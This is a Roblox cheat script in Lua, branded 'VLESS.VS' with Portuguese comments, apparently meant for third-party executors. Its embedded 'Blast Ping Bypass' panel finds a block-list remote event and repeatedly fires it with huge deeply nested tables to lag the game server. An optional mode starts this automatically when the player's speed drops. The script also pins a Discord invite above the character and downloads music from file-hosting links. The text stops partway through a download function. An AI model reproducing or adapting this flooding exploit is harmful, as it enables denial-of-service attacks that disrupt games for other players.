print("[VLESS.VS] boot (PC & Mobile Universal fix)...")
pcall(function()
    if not game:IsLoaded() then
        local t0 = tick()
        while not game:IsLoaded() and (tick() - t0) < 6 do
            task.wait(0.2)
        end
    end
end)

local Players         = game:GetService("Players")
local TweenService    = game:GetService("TweenService")
local Lighting        = game:GetService("Lighting")
local CoreGui         = game:GetService("CoreGui")
local LP              = Players.LocalPlayer
if not LP then
    local t0 = tick()
    while not Players.LocalPlayer and (tick() - t0) < 5 do
        task.wait(0.1)
    end
    LP = Players.LocalPlayer
end

-- Floating Discord invite above the local character.
local function addVlessDiscordTag(character)
    if not character then return end
    local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 8)
    if not head then return end
    local playerGui = LP:FindFirstChildOfClass("PlayerGui") or LP:WaitForChild("PlayerGui", 5)
    if not playerGui then return end
    local old = playerGui:FindFirstChild("VLESSDiscordTag")
    if old then old:Destroy() end
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "VLESSDiscordTag"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 300, 0, 42)
    billboard.StudsOffset = Vector3.new(0, 3.2, 0)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 250
    billboard.Parent = playerGui
    local label = Instance.new("TextLabel")
    label.Name = "InviteText"
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "https://discord.gg/xjfRaEXVR"
    label.TextColor3 = Color3.fromRGB(255, 45, 55)
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.TextStrokeTransparency = 0
    label.Font = Enum.Font.GothamBlack
    label.TextScaled = true
    label.TextWrapped = false
    label.Parent = billboard
    local outline = Instance.new("UIStroke")
    outline.Color = Color3.fromRGB(110, 110, 115)
    outline.Thickness = 1
    outline.Transparency = 0.2
    outline.Parent = label
    task.spawn(function()
        local t0 = tick()
        while billboard.Parent and label.Parent do
            local t = tick() - t0
            label.TextColor3 = Color3.fromRGB(210 + math.floor(45 * (0.5 + 0.5 * math.sin(t * 3))), 30, 40)
            billboard.StudsOffset = Vector3.new(0, 3.2 + math.sin(t * 2.2) * 0.12, 0)
            task.wait(0.04)
        end
    end)
end
if LP and LP.Character then task.spawn(addVlessDiscordTag, LP.Character) end
if LP then LP.CharacterAdded:Connect(function(character) task.wait(0.5); addVlessDiscordTag(character) end) end

local function getSafeGuiParent()
    if gethui then
        local ok, h = pcall(gethui)
        if ok and h then return h end
    end
    if syn and syn.protect_gui then
        local cg = game:GetService("CoreGui")
        local ok = pcall(function()
            local t = Instance.new("Folder")
            syn.protect_gui(t)
            t.Parent = cg
            t:Destroy()
        end)
        if ok then return cg end
    end
    local cg = game:GetService("CoreGui")
    local ok = pcall(function()
        local t = Instance.new("Folder")
        t.Parent = cg
        t:Destroy()
    end)
    if ok then return cg end
    return LP:WaitForChild("PlayerGui", 5) or LP:FindFirstChild("PlayerGui")
end

_G._BlastPingSource = [==[
-- ============================================================
-- BLAST PING BYPASS
-- OPEN abre o painel | CLOSE remove tudo (nada em 2o plano)
-- ============================================================
do
    local UserInputService = game:GetService("UserInputService")
    local TweenService     = game:GetService("TweenService")
    local HttpService      = game:GetService("HttpService")
    local Players          = game:GetService("Players")
    local RunService       = game:GetService("RunService")

    local plr    = Players.LocalPlayer
    local plrGui = plr:WaitForChild("PlayerGui")

    local CONFIG_FILE = "BlastPingBypass_Config.json"
    local HUB_BG = "rbxassetid://78984580985059"
    local HUB_LOGO = "rbxassetid://129738961077597"

    local DEFAULT_CFG = {
        power = 100000,
        interval = 0.125,
        keybindKb = "F",
        keybindGp = "ButtonR2",
        autoBrainrot = true,
        posX = 0.5, posY = 0.5, posXO = 0, posYO = 0,
    }

    local cfg = {
        power = DEFAULT_CFG.power,
        interval = DEFAULT_CFG.interval,
        keybindKb = DEFAULT_CFG.keybindKb,
        keybindGp = DEFAULT_CFG.keybindGp,
        autoBrainrot = DEFAULT_CFG.autoBrainrot,
        posX = DEFAULT_CFG.posX, posY = DEFAULT_CFG.posY,
        posXO = DEFAULT_CFG.posXO, posYO = DEFAULT_CFG.posYO,
    }

    local function _isfile(n)
        local ok, r = pcall(function()
            if isfile then return isfile(n) end
            if syn and syn.isfile then return syn.isfile(n) end
            return false
        end)
        return ok and r
    end
    local function _readfile(n)
        local ok, r = pcall(function()
            if readfile then return readfile(n) end
            if syn and syn.readfile then return syn.readfile(n) end
            return nil
        end)
        return ok and r or nil
    end
    local function _writefile(n, data)
        local ok = pcall(function()
            if writefile then writefile(n, data); return end
            if syn and syn.writefile then syn.writefile(n, data); return end
            if fluxus and fluxus.writefile then fluxus.writefile(n, data); return end
        end)
        return ok
    end

    local function saveConfig()
        pcall(function()
            local payload = HttpService:JSONEncode({
                power = cfg.power,
                interval = cfg.interval,
                keybindKb = cfg.keybindKb,
                keybindGp = cfg.keybindGp,
                autoBrainrot = cfg.autoBrainrot == true,
                posX = cfg.posX, posY = cfg.posY,
                posXO = cfg.posXO, posYO = cfg.posYO,
            })
            _writefile(CONFIG_FILE, payload)
        end)
    end

    local function loadConfig()
        pcall(function()
            if not _isfile(CONFIG_FILE) then return end
            local raw = _readfile(CONFIG_FILE)
            if not raw or raw == "" then return end
            local data = HttpService:JSONDecode(raw)
            if type(data) ~= "table" then return end
            if tonumber(data.power) then cfg.power = math.clamp(math.floor(tonumber(data.power)), 1, 9999999) end
            if tonumber(data.interval) then cfg.interval = math.clamp(tonumber(data.interval), 0.01, 2) end
            if type(data.keybindKb) == "string" then cfg.keybindKb = data.keybindKb end
            if type(data.keybindGp) == "string" then cfg.keybindGp = data.keybindGp end
            if data.autoBrainrot ~= nil then cfg.autoBrainrot = data.autoBrainrot == true end
            if tonumber(data.posX) then cfg.posX = tonumber(data.posX) end
            if tonumber(data.posY) then cfg.posY = tonumber(data.posY) end
            if tonumber(data.posXO) then cfg.posXO = tonumber(data.posXO) end
            if tonumber(data.posYO) then cfg.posYO = tonumber(data.posYO) end
        end)
    end
    loadConfig()

    local active = false
    local listeningFor = nil
    local remote = nil
    local brainrotMode = false
    local lastBrainrotState = false
    local manualOverride = false
    local lagThread = nil

    -- VLESS.VS red, black and gray palette
    local C = {
        bg      = Color3.fromRGB(24, 18, 16),
        panel   = Color3.fromRGB(36, 26, 22),
        card    = Color3.fromRGB(44, 32, 28),
        accent  = Color3.fromRGB(235, 35, 45),
        accent2 = Color3.fromRGB(255, 65, 75),
        white   = Color3.fromRGB(255, 255, 255),
        dim     = Color3.fromRGB(210, 180, 170),
        green   = Color3.fromRGB(100, 255, 160),
        red     = Color3.fromRGB(255, 55, 65),
        wait    = Color3.fromRGB(190, 190, 195),
    }

    local function tw(obj, props, t)
        TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
    end

    local function corner(p, r)
        local c = Instance.new("UICorner")
        c.CornerRadius = UDim.new(0, r or 10)
        c.Parent = p
        return c
    end

    local function stroke(p, col, th, tr)
        local s = Instance.new("UIStroke")
        s.Color = col or C.accent
        s.Thickness = th or 1.2
        s.Transparency = tr or 0.3
        s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        s.Parent = p
        return s
    end

    local function shine(obj, speed)
        local g = Instance.new("UIGradient")
        g.Rotation = 18
        g.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, C.accent),
            ColorSequenceKeypoint.new(0.42, C.accent2),
            ColorSequenceKeypoint.new(0.50, C.white),
            ColorSequenceKeypoint.new(0.58, C.accent2),
            ColorSequenceKeypoint.new(1.00, C.accent),
        })
        g.Offset = Vector2.new(-1, 0)
        g.Parent = obj
        task.spawn(function()
            local off = -1
            while obj.Parent do
                off = off + (speed or 0.022)
                if off > 1 then off = -1 end
                g.Offset = Vector2.new(off, 0)
                task.wait(0.03)
            end
        end)
        return g
    end

    local function resolveKb(name)
        if not name or name == "" or name == "None" then return nil end
        local ok, val = pcall(function() return Enum.KeyCode[name] end)
        return (ok and val) or nil
    end

    local function isGamepad(kc)
        local n = kc.Name
        return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
            or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
    end

    local BLACKLISTED = {
        [Enum.KeyCode.Escape] = true,
        [Enum.KeyCode.LeftControl] = true,
        [Enum.KeyCode.Unknown] = true,
    }

    -- destroy old
    for _, kid in pairs(plrGui:GetChildren()) do
        if kid.Name == "BlastPingBypass" or kid.Name == "GalaxyPingLaggerGui" or kid.Name == "NoxaPingLagger" then
            pcall(function() kid:Destroy() end)
        end
    end
    pcall(function()
        if gethui then
            local h = gethui()
            for _, n in ipairs({"BlastPingBypass", "GalaxyPingLaggerGui", "NoxaPingLagger"}) do
                local o = h:FindFirstChild(n)
                if o then o:Destroy() end
            end
        end
    end)

    local function guiParent()
        if gethui then
            local ok, h = pcall(gethui)
            if ok and h then return h end
        end
        return plrGui
    end

    local screen = Instance.new("ScreenGui")
    screen.Name = "BlastPingBypass"
    screen.ResetOnSpawn = false
    screen.IgnoreGuiInset = true
    screen.DisplayOrder = 12000
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screen.Parent = guiParent()

    -- MAIN
    local MAIN_W, MAIN_H = 260, 300
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
    mainFrame.Position = UDim2.new(cfg.posX or 0.5, cfg.posXO or 0, cfg.posY or 0.5, cfg.posYO or 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BackgroundColor3 = C.bg
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = screen
    corner(mainFrame, 18)
    local mainStroke = stroke(mainFrame, C.accent, 1.5, 0.22)

    -- hub background art
    local bg = Instance.new("ImageLabel", mainFrame)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundTransparency = 1
    bg.Image = HUB_BG
    bg.ScaleType = Enum.ScaleType.Crop
    bg.ImageTransparency = 0.15
    bg.ZIndex = 1
    corner(bg, 18)

    local dim = Instance.new("Frame", mainFrame)
    dim.Size = UDim2.new(1, 0, 1, 0)
    dim.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    dim.BackgroundTransparency = 0.42
    dim.BorderSizePixel = 0
    dim.ZIndex = 2
    corner(dim, 18)

    -- HEADER with VLESS.VS logo
    local header = Instance.new("Frame", mainFrame)
    header.Size = UDim2.new(1, 0, 0, 58)
    header.BackgroundTransparency = 1
    header.ZIndex = 5

    local logo = Instance.new("TextLabel", header)
    logo.AnchorPoint = Vector2.new(0.5, 0.5)
    logo.Position = UDim2.new(0.5, 0, 0.5, 0)
    logo.Size = UDim2.new(0, 190, 0, 40)
    logo.BackgroundTransparency = 1
    logo.Text = "VLESS.VS"
    logo.TextColor3 = Color3.fromRGB(245, 35, 45)
    logo.Font = Enum.Font.GothamBlack
    logo.TextSize = 25
    logo.ZIndex = 6
    shine(logo, 0.02)

    local titleSub = Instance.new("TextLabel", header)
    titleSub.AnchorPoint = Vector2.new(0.5, 1)
    titleSub.Position = UDim2.new(0.5, 0, 1, -2)
    titleSub.Size = UDim2.new(1, -20, 0, 12)
    titleSub.BackgroundTransparency = 1
    titleSub.Text = "PING BYPASS"
    titleSub.TextColor3 = C.dim
    titleSub.Font = Enum.Font.GothamBlack
    titleSub.TextSize = 9
    titleSub.ZIndex = 7

    -- status pill
    local statusPill = Instance.new("Frame", header)
    statusPill.Size = UDim2.new(0, 44, 0, 18)
    statusPill.Position = UDim2.new(0, 10, 0.5, -9)
    statusPill.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
    statusPill.BackgroundTransparency = 0.1
    statusPill.BorderSizePixel = 0
    statusPill.ZIndex = 8
    corner(statusPill, 9)
    stroke(statusPill, C.accent, 1, 0.45)

    local statusLbl = Instance.new("TextLabel", statusPill)
    statusLbl.Size = UDim2.new(1, 0, 1, 0)
    statusLbl.BackgroundTransparency = 1
    statusLbl.Text = "OFF"
    statusLbl.TextColor3 = C.red
    statusLbl.Font = Enum.Font.GothamBlack
    statusLbl.TextSize = 9
    statusLbl.ZIndex = 9

    -- CLOSE
    local closeBtn = Instance.new("TextButton", header)
    closeBtn.Size = UDim2.new(0, 26, 0, 26)
    closeBtn.Position = UDim2.new(1, -34, 0.5, -13)
    closeBtn.BackgroundColor3 = C.card
    closeBtn.BackgroundTransparency = 0.08
    closeBtn.Text = "X"
    closeBtn.TextColor3 = C.white
    closeBtn.Font = Enum.Font.GothamBlack
    closeBtn.TextSize = 13
    closeBtn.AutoButtonColor = false
    closeBtn.ZIndex = 8
    corner(closeBtn, 8)
    stroke(closeBtn, C.accent, 1, 0.3)

    -- BODY
    local body = Instance.new("Frame", mainFrame)
    body.Position = UDim2.new(0, 12, 0, 64)
    body.Size = UDim2.new(1, -24, 1, -74)
    body.BackgroundTransparency = 1
    body.ZIndex = 5

    -- power card
    local card = Instance.new("Frame", body)
    card.AnchorPoint = Vector2.new(0.5, 0)
    card.Position = UDim2.new(0.5, 0, 0, 0)
    card.Size = UDim2.new(1, 0, 0, 72)
    card.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
    card.BackgroundTransparency = 0.15
    card.BorderSizePixel = 0
    card.ZIndex = 6
    corner(card, 14)
    stroke(card, C.accent, 1.2, 0.35)

    local powerLbl = Instance.new("TextLabel", card)
    powerLbl.AnchorPoint = Vector2.new(0.5, 0.5)
    powerLbl.Position = UDim2.new(0.5, 0, 0.5, -4)
    powerLbl.Size = UDim2.new(0.9, 0, 0, 30)
    powerLbl.BackgroundTransparency = 1
    powerLbl.Text = tostring(cfg.power)
    powerLbl.TextColor3 = C.white
    powerLbl.Font = Enum.Font.GothamBlack
    powerLbl.TextSize = 26
    powerLbl.ZIndex = 7
    shine(powerLbl, 0.025)

    local powerHint = Instance.new("TextLabel", card)
    powerHint.AnchorPoint = Vector2.new(0.5, 1)
    powerHint.Position = UDim2.new(0.5, 0, 1, -6)
    powerHint.Size = UDim2.new(1, -8, 0, 12)
    powerHint.BackgroundTransparency = 1
    powerHint.Text = "POWER"
    powerHint.TextColor3 = C.dim
    powerHint.Font = Enum.Font.GothamBold
    powerHint.TextSize = 9
    powerHint.ZIndex = 7

    -- power input
    local powerBox = Instance.new("TextBox", body)
    powerBox.AnchorPoint = Vector2.new(0.5, 0)
    powerBox.Position = UDim2.new(0.5, 0, 0, 80)
    powerBox.Size = UDim2.new(1, 0, 0, 28)
    powerBox.BackgroundColor3 = C.card
    powerBox.BackgroundTransparency = 0.1
    powerBox.BorderSizePixel = 0
    powerBox.Text = tostring(cfg.power)
    powerBox.PlaceholderText = "Custom power..."
    powerBox.TextColor3 = C.white
    powerBox.PlaceholderColor3 = C.dim
    powerBox.TextSize = 13
    powerBox.Font = Enum.Font.GothamBold
    powerBox.ClearTextOnFocus = false
    powerBox.ZIndex = 7
    corner(powerBox, 10)
    stroke(powerBox, C.accent, 1, 0.4)

    -- interval
    local intervalBox = Instance.new("TextBox", body)
    intervalBox.AnchorPoint = Vector2.new(0.5, 0)
    intervalBox.Position = UDim2.new(0.5, 0, 0, 114)
    intervalBox.Size = UDim2.new(1, 0, 0, 28)
    intervalBox.BackgroundColor3 = C.card
    intervalBox.BackgroundTransparency = 0.1
    intervalBox.BorderSizePixel = 0
    intervalBox.Text = tostring(cfg.interval)
    intervalBox.PlaceholderText = "Delay (secs)"
    intervalBox.TextColor3 = C.white
    intervalBox.PlaceholderColor3 = C.dim
    intervalBox.TextSize = 13
    intervalBox.Font = Enum.Font.GothamBold
    intervalBox.ClearTextOnFocus = false
    intervalBox.ZIndex = 7
    corner(intervalBox, 10)
    stroke(intervalBox, C.accent, 1, 0.4)

    -- ACTIVATE
    local actBtn = Instance.new("TextButton", body)
    actBtn.AnchorPoint = Vector2.new(0.5, 0)
    actBtn.Position = UDim2.new(0.5, 0, 0, 150)
    actBtn.Size = UDim2.new(1, 0, 0, 36)
    actBtn.BackgroundColor3 = C.card
    actBtn.BackgroundTransparency = 0.05
    actBtn.BorderSizePixel = 0
    actBtn.Text = "ACTIVATE"
    actBtn.TextColor3 = C.white
    actBtn.TextSize = 14
    actBtn.Font = Enum.Font.GothamBlack
    actBtn.AutoButtonColor = false
    actBtn.ZIndex = 7
    corner(actBtn, 12)
    local actStroke = stroke(actBtn, C.accent, 1.3, 0.28)
    shine(actBtn, 0.02)

    -- Auto Brainrot row
    local autoRow = Instance.new("Frame", body)
    autoRow.Position = UDim2.new(0, 0, 0, 194)
    autoRow.Size = UDim2.new(1, 0, 0, 28)
    autoRow.BackgroundColor3 = C.card
    autoRow.BackgroundTransparency = 0.12
    autoRow.BorderSizePixel = 0
    autoRow.ZIndex = 7
    corner(autoRow, 10)
    stroke(autoRow, C.accent, 1, 0.45)

    local autoLbl = Instance.new("TextLabel", autoRow)
    autoLbl.Size = UDim2.new(0.55, 0, 1, 0)
    autoLbl.Position = UDim2.new(0, 10, 0, 0)
    autoLbl.BackgroundTransparency = 1
    autoLbl.Text = "Auto Brainrot"
    autoLbl.TextColor3 = C.dim
    autoLbl.Font = Enum.Font.GothamBold
    autoLbl.TextSize = 11
    autoLbl.TextXAlignment = Enum.TextXAlignment.Left
    autoLbl.ZIndex = 8

    local autoBtn = Instance.new("TextButton", autoRow)
    autoBtn.Size = UDim2.new(0, 54, 0, 22)
    autoBtn.Position = UDim2.new(1, -62, 0.5, -11)
    autoBtn.BackgroundColor3 = cfg.autoBrainrot and C.accent or Color3.fromRGB(45, 45, 50)
    autoBtn.BorderSizePixel = 0
    autoBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
    autoBtn.TextColor3 = C.white
    autoBtn.Font = Enum.Font.GothamBlack
    autoBtn.TextSize = 10
    autoBtn.AutoButtonColor = false
    autoBtn.ZIndex = 8
    corner(autoBtn, 8)

    -- keybinds
    local kbBtn = Instance.new("TextButton", body)
    kbBtn.Position = UDim2.new(0, 0, 0, 230)
    kbBtn.Size = UDim2.new(0.48, -4, 0, 28)
    kbBtn.BackgroundColor3 = C.card
    kbBtn.BackgroundTransparency = 0.1
    kbBtn.BorderSizePixel = 0
    kbBtn.Text = "KB [" .. (cfg.keybindKb or "F") .. "]"
    kbBtn.TextColor3 = C.white
    kbBtn.Font = Enum.Font.GothamBold
    kbBtn.TextSize = 10
    kbBtn.AutoButtonColor = false
    kbBtn.ZIndex = 7
    corner(kbBtn, 9)
    stroke(kbBtn, C.accent, 1, 0.4)

    local gpBtn = Instance.new("TextButton", body)
    gpBtn.Position = UDim2.new(0.52, 0, 0, 230)
    gpBtn.Size = UDim2.new(0.48, -0, 0, 28)
    gpBtn.BackgroundColor3 = C.card
    gpBtn.BackgroundTransparency = 0.1
    gpBtn.BorderSizePixel = 0
    gpBtn.Text = "GP [" .. (cfg.keybindGp or "R2") .. "]"
    gpBtn.TextColor3 = C.white
    gpBtn.Font = Enum.Font.GothamBold
    gpBtn.TextSize = 10
    gpBtn.AutoButtonColor = false
    gpBtn.ZIndex = 7
    corner(gpBtn, 9)
    stroke(gpBtn, C.accent, 1, 0.4)

    -- logic
    local function findRemote()
        local rrs = game:FindFirstChild("RobloxReplicatedStorage")
        if not rrs then pcall(function() rrs = game:GetService("RobloxReplicatedStorage") end) end
        if not rrs then return nil end
        for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList", "BlockList"}) do
            local r = rrs:FindFirstChild(name)
            if r and r:IsA("RemoteEvent") then return r end
        end
        for _, c in ipairs(rrs:GetChildren()) do
            if c:IsA("RemoteEvent") and tostring(c.Name):find("Block") then return c end
        end
        return nil
    end

    local function buildPayload(power)
        local main, nested = {}, {{}}
        local current = nested[1]
        for _ = 1, 186 do
            local n = {}
            table.insert(current, n)
            current = n
        end
        local maxRep = math.min(math.floor((tonumber(power) or 70000) / 188), 10000)
        for _ = 1, math.max(1, maxRep) do
            table.insert(main, nested)
        end
        return main
    end

    local function stopLag()
        active = false
        if lagThread then pcall(task.cancel, lagThread); lagThread = nil end
    end

    local function runPingLoop()
        local delay = cfg.interval
        while active do
            local r = remote or findRemote()
            remote = r
            if not r then
                task.wait(0.3)
                remote = findRemote()
                if not remote then active = false; break end
            end
            local payload = buildPayload(cfg.power)
            local ok = pcall(function() remote:FireServer(payload) end)
            if not ok then
                delay = math.min(delay * 1.4, 0.5)
            else
                delay = math.max(delay * 0.995, 0.05)
            end
            task.wait(delay)
        end
        lagThread = nil
    end

    local function paintActive()
        if active then
            actBtn.Text = "DEACTIVATE"
            actBtn.BackgroundColor3 = Color3.fromRGB(190, 25, 35)
            actStroke.Color = C.white
            actStroke.Transparency = 0.1
            statusLbl.Text = "ON"
            statusLbl.TextColor3 = C.green
            mainStroke.Color = C.green
            mainStroke.Transparency = 0.15
            tw(statusPill, {BackgroundColor3 = Color3.fromRGB(10, 40, 24)}, 0.15)
        else
            actBtn.Text = "ACTIVATE"
            actBtn.BackgroundColor3 = C.card
            actStroke.Color = C.accent
            actStroke.Transparency = 0.28
            statusLbl.Text = "OFF"
            statusLbl.TextColor3 = C.red
            mainStroke.Color = C.accent
            mainStroke.Transparency = 0.22
            tw(statusPill, {BackgroundColor3 = Color3.fromRGB(24, 24, 28)}, 0.15)
        end
        powerLbl.Text = tostring(cfg.power)
    end

    local function flipLag(state, isManual)
        if isManual then
            if brainrotMode then
                manualOverride = not state
            else
                manualOverride = false
            end
        end
        if state then
            remote = remote or findRemote()
            if not remote then
                remote = findRemote()
                if not remote then
                    warn("[BLAST PING] Remote BlockList nao encontrado")
                    active = false
                    paintActive()
                    return
                end
            end
            stopLag()
            active = true
            lagThread = task.spawn(runPingLoop)
        else
            stopLag()
        end
        paintActive()
        saveConfig()
    end

    actBtn.MouseButton1Click:Connect(function()
        flipLag(not active, true)
    end)

    powerBox.FocusLost:Connect(function()
        local n = tonumber(powerBox.Text)
        if n then
            cfg.power = math.clamp(math.floor(n + 0.5), 1, 9999999)
            powerBox.Text = tostring(cfg.power)
            powerLbl.Text = tostring(cfg.power)
            saveConfig()
        else
            powerBox.Text = tostring(cfg.power)
        end
    end)

    intervalBox.FocusLost:Connect(function()
        local n = tonumber(intervalBox.Text)
        if n then
            cfg.interval = math.clamp(n, 0.01, 2)
            intervalBox.Text = tostring(cfg.interval)
            saveConfig()
        else
            intervalBox.Text = tostring(cfg.interval)
        end
    end)

    autoBtn.MouseButton1Click:Connect(function()
        cfg.autoBrainrot = not cfg.autoBrainrot
        autoBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
        tw(autoBtn, {BackgroundColor3 = cfg.autoBrainrot and C.accent or Color3.fromRGB(45, 45, 50)}, 0.12)
        saveConfig()
    end)

    local function updateKbLabels()
        if listeningFor == "kb" then
            kbBtn.Text = "Press key..."
            kbBtn.TextColor3 = C.wait
        else
            kbBtn.Text = "KB [" .. (cfg.keybindKb or "None") .. "]"
            kbBtn.TextColor3 = C.white
        end
        if listeningFor == "gp" then
            gpBtn.Text = "Press btn..."
            gpBtn.TextColor3 = C.wait
        else
            gpBtn.Text = "GP [" .. (cfg.keybindGp or "None") .. "]"
            gpBtn.TextColor3 = C.white
        end
    end

    kbBtn.MouseButton1Click:Connect(function()
        listeningFor = (listeningFor == "kb") and nil or "kb"
        updateKbLabels()
    end)
    gpBtn.MouseButton1Click:Connect(function()
        listeningFor = (listeningFor == "gp") and nil or "gp"
        updateKbLabels()
    end)

    -- auto brainrot
    RunService.Heartbeat:Connect(function()
        if not cfg.autoBrainrot then
            if brainrotMode then
                brainrotMode = false
                lastBrainrotState = false
            end
            return
        end
        local char = plr.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local hasBrainrot = hum.WalkSpeed > 0 and hum.WalkSpeed < 25
        if hasBrainrot and not lastBrainrotState then
            brainrotMode = true
            lastBrainrotState = true
            manualOverride = false
            if not active then flipLag(true, false) end
        elseif not hasBrainrot and lastBrainrotState then
            brainrotMode = false
            lastBrainrotState = false
            manualOverride = false
            if active then flipLag(false, false) end
        end
    end)

    UserInputService.InputBegan:Connect(function(input, processed)
        local kc = input.KeyCode
        if kc == Enum.KeyCode.Unknown then return end
        local isGp = isGamepad(kc)
        local isKb = input.UserInputType == Enum.UserInputType.Keyboard

        if listeningFor then
            if kc == Enum.KeyCode.Escape then
                listeningFor = nil
                updateKbLabels()
                return
            end
            if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
                cfg.keybindKb = kc.Name
                listeningFor = nil
                updateKbLabels()
                saveConfig()
                return
            end
            if listeningFor == "gp" and isGp then
                cfg.keybindGp = kc.Name
                listeningFor = nil
                updateKbLabels()
                saveConfig()
                return
            end
            return
        end

        if processed then return end
        local kbEnum = resolveKb(cfg.keybindKb)
        local gpEnum = resolveKb(cfg.keybindGp)
        if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
            flipLag(not active, true)
        end
    end)

    -- drag + save position
    local dragging, dragStart, startPos
    mainFrame.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = i.Position
            startPos = mainFrame.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if not dragging then return end
        if i.UserInputType ~= Enum.UserInputType.MouseMovement and i.UserInputType ~= Enum.UserInputType.Touch then return end
        local d = i.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                cfg.posX = mainFrame.Position.X.Scale
                cfg.posXO = mainFrame.Position.X.Offset
                cfg.posY = mainFrame.Position.Y.Scale
                cfg.posYO = mainFrame.Position.Y.Offset
                saveConfig()
            end
            dragging = false
        end
    end)

    local function closeAll()
        stopLag()
        pcall(function() screen:Destroy() end)
        _G.BlastPingIsOpen = function() return false end
    end

    closeBtn.MouseButton1Click:Connect(closeAll)

    _G.BlastPingClose = closeAll
    _G.BlastPingIsOpen = function()
        return screen and screen.Parent ~= nil
    end

    paintActive()
    updateKbLabels()
    saveConfig() -- force write on open so file always exists
    print("[BLAST] Ping Bypass ready")
end
]==]




-- ============================================================
-- VLESS.VS INTRO: a abertura dura 10 segundos desde que a tela aparece.
-- Skip Intro encerra a abertura e para a musica imediatamente.
-- A faixa enviada e baixada uma vez e reproduzida como arquivo local pelo executor.
-- Reproduzir MP3 por URL diretamente em SoundId nao funciona no Roblox.
-- ============================================================
local INTRO_DURATION = 10
local INTRO = {
    enabled = true,
    music = 1,
    matchEnabled = false,
    matchMusic = 1,
    animeUrl = "",
    animeAsset = "",
    OPTIONS = {},
    stopPreview = nil,
    stopPlayback = nil,
    getSongName = nil,
    preview = nil,
    play = nil,
    playMatch = nil,
    stopMatch = nil,
    getMatchSongName = nil,
}

(function()
    local SoundService = game:GetService("SoundService")

    local INTRO_MUSIC_OPTIONS = {
        {name="RyzenxHub Intro", url="https://project--86964ab4-117d-44b0-9478-4dc13565dcc9-dev.lovable.app/__l5e/assets-v1/62bda52a-420e-4b45-98e6-c3c2f5798ec7/RyzenxHub_IntroSong_10.mp3", file="RyzenxHub_IntroSong_10.mp3", startTime=0},
        {name="Song 2", url="https://files.catbox.moe/2a7jyx.mp3", file="BlastIntroSong_2.mp3"},
        {name="Song 3", url="https://files.catbox.moe/rcgr9f.mp3", file="BlastIntroSong_3.mp3"},
        {name="Song 4", url="https://litter.catbox.moe/m493detpu1asdmin.mp3", file="BlastIntroSong_4_new.mp3", startTime=51},
        {name="Song 5", url="https://files.catbox.moe/6eigoh.mp3", file="BlastIntroSong_5.mp3"},
        {name="Song 6", url="https://litter.catbox.moe/c7opcv.mp3", file="BlastIntroSong_6_pupsies.mp3", startTime=6},
        {name="Song 7", url="https://files.catbox.moe/iyw1cb.mp3", file="BlastIntroSong_7.mp3"},
        {name="Song 8", assetId="rbxassetid://76650356472656", startTime=3, volume=1},
        {name="Song 9", url="https://files.catbox.moe/mzvrir.mp3", file="BlastIntroSong_1.mp3"},
        {name="Song 10", url="https://litter.catbox.moe/xkew3553w380fzfb.mp3", file="BlastIntroSong_10.mp3", startTime=29},
    }

    local introPreviewSound = nil
    local introPlaybackSound = nil
    local introPreviewToken = 0
    local introPlaybackToken = 0
    local introSongCache = {}
    local introSongDownloading = {}

    local function stopIntroPreview()
        introPreviewToken = introPreviewToken + 1
        if introPreviewSound then
            pcall(function() introPreviewSound:Stop() end)
            pcall(function() introPreviewSound:Destroy() end)
            introPreviewSound = nil
        end
    end

    local function stopIntroPlayback()
        introPlaybackToken = introPlaybackToken + 1
        if introPlaybackSound then
            pcall(function() introPlaybackSound:Stop() end)
            pcall(function() introPlaybackSound:Destroy() end)
            introPlaybackSound = nil
        end
    end

    local function getIntroSongName()
        local opt = INTRO_MUSIC_OPTIONS[INTRO.music]
        return opt and opt.name or "No Songs Added"
    end

    local function _safeNotify(msg)
        print("[BLAST] " .. tostring(msg))
    end

    local function _httpGetBody(url)
        if not url or url == "" then return nil end
        local body = nil
        local function tryReq(fn)
            if body and #body > 1000 then return end
            pcall(function()
                local res = fn()
                if type(res) == "string" and #res > 1000 then
                    body = res
                elseif type(res) == "table" then
                    local b = res.Body or res.body or res.Data or res.data
                    if type(b) == "string" and #b > 1000 then body = b end
                end
            end)
        end
        tryReq(function()
            if request then return request({Url = url, Method = "GET"}) end
        end)
        tryReq(function()
            if http_request then return http_request({Url = url, Method = "GET"}) end
        end)
        tryReq(function()
